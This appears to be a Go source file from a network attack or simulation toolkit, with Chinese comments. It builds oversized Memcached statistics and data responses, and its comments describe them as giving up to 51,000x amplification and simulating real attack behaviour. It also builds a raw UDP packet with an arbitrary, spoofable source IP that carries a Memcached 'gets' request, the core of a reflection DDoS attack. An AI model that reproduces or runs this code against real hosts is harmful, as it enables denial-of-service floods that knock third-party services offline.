package protocol

import (
	"bytes"
	"fmt"
	"strings"
)

// MEMCACHEDResponseBuffer 生成Memcached协议响应
// 放大倍数：高达51,000倍
// 返回多个响应包以便循环发送，模拟真实攻击行为
func MEMCACHEDResponseBuffer() [][]byte {
	// 创建多个响应包
	responses := make([][]byte, 0, 20)
	
	// 基本服务器信息包
	basicStats := new(bytes.Buffer)
	addMemcachedStat(basicStats, "pid", "12345")
	addMemcachedStat(basicStats, "uptime", "8541236")
	addMemcachedStat(basicStats, "time", "1634567890")
	addMemcachedStat(basicStats, "version", "1.6.12")
	addMemcachedStat(basicStats, "rusage_user", "13541.519000")
	addMemcachedStat(basicStats, "rusage_system", "36788.920000")
	addMemcachedStat(basicStats, "curr_connections", "42")
	addMemcachedStat(basicStats, "total_connections", "547281")
	addMemcachedStat(basicStats, "rejected_connections", "0")
	addMemcachedStat(basicStats, "connection_structures", "43")
	basicStats.WriteString("END\r\n")
	responses = append(responses, basicStats.Bytes())
	
	// 命令统计包
	cmdStats := new(bytes.Buffer)
	addMemcachedStat(cmdStats, "cmd_get", "157681241")
	addMemcachedStat(cmdStats, "cmd_set", "18745")
	addMemcachedStat(cmdStats, "cmd_flush", "0")
	addMemcachedStat(cmdStats, "get_hits", "156874177")
	addMemcachedStat(cmdStats, "get_misses", "807064")
	addMemcachedStat(cmdStats, "delete_misses", "41333")
	addMemcachedStat(cmdStats, "delete_hits", "158745")
	addMemcachedStat(cmdStats, "incr_misses", "0")
	addMemcachedStat(cmdStats, "incr_hits", "0")
	addMemcachedStat(cmdStats, "decr_misses", "0")
	addMemcachedStat(cmdStats, "decr_hits", "0")
	addMemcachedStat(cmdStats, "cas_misses", "0")
	addMemcachedStat(cmdStats, "cas_hits", "0")
	addMemcachedStat(cmdStats, "cas_badval", "0")
	addMemcachedStat(cmdStats, "touch_hits", "0")
	addMemcachedStat(cmdStats, "touch_misses", "0")
	addMemcachedStat(cmdStats, "auth_cmds", "0")
	addMemcachedStat(cmdStats, "auth_errors", "0")
	cmdStats.WriteString("END\r\n")
	responses = append(responses, cmdStats.Bytes())
	
	// 内存统计包
	memStats := new(bytes.Buffer)
	addMemcachedStat(memStats, "bytes", "8947355144")
	addMemcachedStat(memStats, "bytes_read", "6700631397895")
	addMemcachedStat(memStats, "bytes_written", "160657180891521")
	addMemcachedStat(memStats, "limit_maxbytes", "67108864000")
	addMemcachedStat(memStats, "curr_items", "12845113")
	addMemcachedStat(memStats, "total_items", "18745")
	addMemcachedStat(memStats, "evictions", "0")
	addMemcachedStat(memStats, "reclaimed", "0")
	memStats.WriteString("END\r\n")
	responses = append(responses, memStats.Bytes())
	
	// 添加多个自定义统计包，每个包都很大
	for i := 0; i < 5; i++ {
		customStats := new(bytes.Buffer)
		// 每个包添加几个非常长的值
		for j := 0; j < 4; j++ {
			key := fmt.Sprintf("custom_stat_pkg%d_%d", i, j)
			// 为每个自定义统计创建一个长值 (~50KB)
			value := strings.Repeat(fmt.Sprintf("long_value_%d_%d_", i, j), 5000)
			addMemcachedStat(customStats, key, value)
		}
		customStats.WriteString("END\r\n")
		responses = append(responses, customStats.Bytes())
	}
	
	// 添加多个slab统计包
	slabsPerPacket := 6
	for pkgIdx := 0; pkgIdx < 7; pkgIdx++ {
		slabStats := new(bytes.Buffer)
		startSlab := 1 + pkgIdx*slabsPerPacket
		endSlab := startSlab + slabsPerPacket
		if endSlab > 42 {
			endSlab = 42
		}
		
		for slabClass := startSlab; slabClass <= endSlab; slabClass++ {
			prefix := fmt.Sprintf("slab_%d", slabClass)
			
			addMemcachedStat(slabStats, prefix+"_chunk_size", fmt.Sprintf("%d", 96*slabClass))
			addMemcachedStat(slabStats, prefix+"_chunks_per_page", fmt.Sprintf("%d", 10240/slabClass))
			addMemcachedStat(slabStats, prefix+"_total_pages", fmt.Sprintf("%d", slabClass*10))
			addMemcachedStat(slabStats, prefix+"_total_chunks", fmt.Sprintf("%d", slabClass*100))
			addMemcachedStat(slabStats, prefix+"_used_chunks", fmt.Sprintf("%d", slabClass*50))
			addMemcachedStat(slabStats, prefix+"_free_chunks", fmt.Sprintf("%d", slabClass*50))
			addMemcachedStat(slabStats, prefix+"_free_chunks_end", fmt.Sprintf("%d", slabClass*25))
			addMemcachedStat(slabStats, prefix+"_mem_requested", fmt.Sprintf("%d", slabClass*1000000))
			
			// 添加一些额外的slab特定统计以增加响应大小
			for j := 0; j < 5; j++ {
				subKey := fmt.Sprintf("_custom_metric_%d", j)
				value := strings.Repeat(fmt.Sprintf("slab%d_value_%d_", slabClass, j), 100)
				addMemcachedStat(slabStats, prefix+subKey, value)
			}
		}
		slabStats.WriteString("END\r\n")
		responses = append(responses, slabStats.Bytes())
	}
	
	// 添加一些大项目数据包
	for i := 0; i < 5; i++ {
		itemsData := new(bytes.Buffer)
		// 每个包包含2个大项目
		for j := i*2; j < (i+1)*2; j++ {
			key := fmt.Sprintf("bigitem_%d", j)
			flags := "0"
			// 创建一个大数据块 (~50KB)
			dataBlock := strings.Repeat(fmt.Sprintf("BIGDATA_%d_", j), 5000)
			
			valueCmd := fmt.Sprintf("VALUE %s %s %d\r\n%s\r\n", 
				key, flags, len(dataBlock), dataBlock)
			itemsData.WriteString(valueCmd)
		}
		itemsData.WriteString("END\r\n")
		responses = append(responses, itemsData.Bytes())
	}
	
	return responses
}

// addMemcachedStat 添加单个Memcached统计行
func addMemcachedStat(buf *bytes.Buffer, name, value string) {
	statLine := fmt.Sprintf("STAT %s %s\r\n", name, value)
	buf.WriteString(statLine)
}

func MEMCACHEDPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
    payload := append(
		[]byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00}, 
		[]byte("gets p h e\n")...,                            // Memcached "gets" 命令
	)
    return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
}